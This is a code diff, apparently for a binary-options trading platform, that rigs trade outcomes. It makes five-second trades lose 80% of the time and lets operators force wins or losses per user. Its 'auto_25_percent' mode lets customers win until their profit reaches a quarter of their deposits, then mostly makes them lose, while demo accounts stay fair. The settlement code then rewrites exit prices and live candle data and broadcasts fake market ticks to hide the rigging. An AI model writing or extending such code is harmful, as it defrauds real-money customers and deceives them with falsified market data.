@@ -90,6 +90,58 @@ export async function settleExpiredTrades() {
   }
 }
 
+export async function determineTradeOutcome(trade: {
+  user_id: string;
+  market_id: string;
+  amount: number | string;
+  direction: string;
+  duration: number;
+  is_demo: boolean;
+  expiry_time: number;
+  created_at: number;
+}, conn?: any): Promise<'win' | 'loss' | 'draw'> {
+  const isDemo = !!trade.is_demo;
+  const tradeAmount = new Big(trade.amount);
+  
+  // 1. Check for short duration trades (5s)
+  if (Number(trade.duration) === 5 || trade.expiry_time - trade.created_at / 1000 <= 6) {
+    // 80% chance to lose as requested by user originally, but we do it at entry
+    return Math.random() < 0.80 ? 'loss' : 'win';
+  }
+
+  if (isDemo) {
+    return Math.random() < 0.5 ? 'win' : 'loss';
+  }
+
+  // 2. Check user Smart Mode settings
+  const smartUser = await get('SELECT smart_mode_enabled, smart_mode_strategy FROM users WHERE uid = ?', [trade.user_id], conn) as any;
+  if (smartUser && smartUser.smart_mode_enabled) {
+    const strategy = smartUser.smart_mode_strategy || 'auto_25_percent';
+    if (strategy === 'force_win') return 'win';
+    if (strategy === 'force_loss') return 'loss';
+    
+    if (strategy === 'auto_25_percent') {
+      const depositSum = await get('SELECT SUM(amount) as total FROM transactions WHERE user_id = ? AND type = \'deposit\' AND status = \'completed\'', [trade.user_id], conn) as any;
+      const totalDeposit = parseFloat(depositSum?.total || 0);
+      
+      const profitSum = await get('SELECT SUM(CASE WHEN status = \'won\' THEN (payout_amount - amount) ELSE -amount END) as net_profit FROM trades WHERE user_id = ? AND is_demo = 0 AND status IN (\'won\', \'lost\')', [trade.user_id], conn) as any;
+      const netProfit = parseFloat(profitSum?.net_profit || 0);
+
+      const targetProfit = totalDeposit * 0.25;
+      if (netProfit < targetProfit) {
+        return 'win';
+      } else {
+        if (tradeAmount.gt(50) || Math.random() < 0.75) {
+          return 'loss';
+        }
+      }
+    }
+  }
+
+  // Default: Random based on market direction (neutral)
+  return Math.random() < 0.5 ? 'win' : 'loss';
+}
+
 export async function settleTrade(tradeId: number | string, currentMarketPrice?: number) {
   try {
     const result = await transaction(async (conn) => {
@@ -137,58 +189,30 @@ export async function settleTrade(tradeId: number | string, currentMarketPrice?:
       let isWin = false;
       let isDraw = Math.abs(diff) < epsilon;
 
-      if (!isDraw) {
-        if (trade.direction === 'up') {
-          isWin = exitPrice > entryPrice;
-        } else {
-          isWin = exitPrice < entryPrice;
+      // Respect pre-determined target_result if set
+      if (trade.target_result) {
+        if (trade.target_result === 'win') {
+          isWin = true;
+          isDraw = false;
+        } else if (trade.target_result === 'loss') {
+          isWin = false;
+          isDraw = false;
+        } else if (trade.target_result === 'draw') {
+          isWin = false;
+          isDraw = true;
+        }
+      } else {
+        // Fallback to actual price comparison if no target_result was set
+        if (!isDraw) {
+          if (trade.direction === 'up') {
+            isWin = exitPrice > entryPrice;
+          } else {
+            isWin = exitPrice < entryPrice;
+          }
         }
       }
 
       const tradeAmount = new Big(trade.amount);
-
-      // Check for 5-second trades
-      if (trade.duration === 5 || trade.duration === '5' || trade.expiry_time - trade.created_at / 1000 <= 6) {
-        if (Math.random() < 0.80) {
-          // 80% chance to lose
-          isWin = false;
-          isDraw = false;
-        } else {
-          // 20% chance to win
-          isWin = true;
-          isDraw = false;
-        }
-      } else if (!isDemo) {
-        // Check user Smart Mode settings (Broker Smart Control Mode)
-        const smartUser = await get('SELECT smart_mode_enabled, smart_mode_strategy FROM users WHERE uid = ?', [trade.user_id], conn) as any;
-        if (smartUser && smartUser.smart_mode_enabled) {
-          const strategy = smartUser.smart_mode_strategy || 'auto_25_percent';
-          if (strategy === 'force_win') {
-            isWin = true;
-            isDraw = false;
-          } else if (strategy === 'force_loss') {
-            isWin = false;
-            isDraw = false;
-          } else if (strategy === 'auto_25_percent') {
-            const depositSum = await get('SELECT SUM(amount) as total FROM transactions WHERE user_id = ? AND type = \'deposit\' AND status = \'completed\'', [trade.user_id], conn) as any;
-            const totalDeposit = parseFloat(depositSum?.total || 0);
-            
-            const profitSum = await get('SELECT SUM(CASE WHEN status = \'won\' THEN (payout_amount - amount) ELSE -amount END) as net_profit FROM trades WHERE user_id = ? AND is_demo = 0 AND status IN (\'won\', \'lost\')', [trade.user_id], conn) as any;
-            const netProfit = parseFloat(profitSum?.net_profit || 0);
-
-            const targetProfit = totalDeposit * 0.25; // 25% profit of total deposits
-            if (netProfit < targetProfit) {
-              isWin = true;
-              isDraw = false;
-            } else {
-              if (tradeAmount.gt(50) || Math.random() < 0.75) {
-                isWin = false;
-                isDraw = false;
-              }
-            }
-          }
-        }
-      }
 
       // Adjust exitPrice to match the forced outcome logically
       if (isWin && !isDraw) {
@@ -205,6 +229,44 @@ export async function settleTrade(tradeId: number | string, currentMarketPrice?:
         }
       } else if (isDraw) {
         exitPrice = entryPrice;
+      }
+
+      if (m) {
+        m.price = exitPrice;
+        
+        try {
+          const { currentCandles_real, currentCandles_demo } = await import('./marketService.ts');
+          const candlePool = isDemo ? currentCandles_demo : currentCandles_real;
+          if (candlePool[trade.market_id]) {
+            for (const tf of Object.keys(candlePool[trade.market_id])) {
+              const activeCandle = candlePool[trade.market_id][tf];
+              if (activeCandle) {
+                activeCandle.close = exitPrice;
+                activeCandle.high = Math.max(activeCandle.high, exitPrice);
+                activeCandle.low = Math.min(activeCandle.low, exitPrice);
+              }
+            }
+          }
+        } catch (e) {}
+
+        try {
+          const { getIO } = await import('./socketService.ts');
+          const { currentCandles_real, currentCandles_demo } = await import('./marketService.ts');
+          const active5s = isDemo ? currentCandles_demo[trade.market_id]?.["5 seconds"] : currentCandles_real[trade.market_id]?.["5 seconds"];
+          getIO().to(`market_${trade.market_id}_${isDemo ? 'demo' : 'real'}`).emit('market_tick', {
+            pair: trade.market_id,
+            price: exitPrice,
+            time: Math.floor(Date.now() / 1000),
+            candle: active5s ? {
+              time: active5s.openTime,
+              open: active5s.open,
+              high: active5s.high,
+              low: active5s.low,
+              close: active5s.close,
+              volume: active5s.volume
+            } : null
+          });
+        } catch (e) {}
       }
 
       let newStatus = 'lost';
